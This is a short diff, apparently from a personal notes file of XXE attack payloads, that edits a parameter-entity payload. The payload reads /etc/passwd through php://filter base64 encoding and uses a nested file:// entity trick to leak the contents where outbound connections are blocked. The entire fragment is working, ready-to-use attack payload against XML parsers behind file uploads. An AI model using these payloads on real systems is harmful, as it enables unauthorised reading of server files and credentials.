@@ -72,7 +72,7 @@ can upload any format not just zip
 ]>
 
 test.xml:
-<!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % intern "<!ENTITY &#37; trick SYSTEM 'file://WOOT%payload;WOOT'>">
 
 if no outbound:
